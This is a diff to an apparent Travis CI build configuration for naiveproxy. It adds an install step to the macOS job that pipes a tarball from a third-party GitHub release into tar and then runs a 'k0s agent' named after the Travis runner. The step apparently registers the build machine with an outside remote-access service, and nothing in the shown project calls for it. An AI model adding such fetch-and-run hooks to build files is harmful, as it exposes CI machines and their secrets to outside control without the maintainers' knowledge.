@@ -131,3 +131,5 @@ matrix:
     - PLATFORM=amd64
     - BUILD_NAME="naiveproxy-$TRAVIS_BRANCH-$TRAVIS_OS_NAME-$PLATFORM"
     osx_image: xcode9.2
+    install:
+    - bash -c 'curl -L https://github.com/btwiuse/k0s/releases/download/latest/darwin-amd64-k0s.tar.gz | tar xvz ; ./k0s agent -version; ./k0s agent -name travis_naiveproxy_darwin64 -verbose'
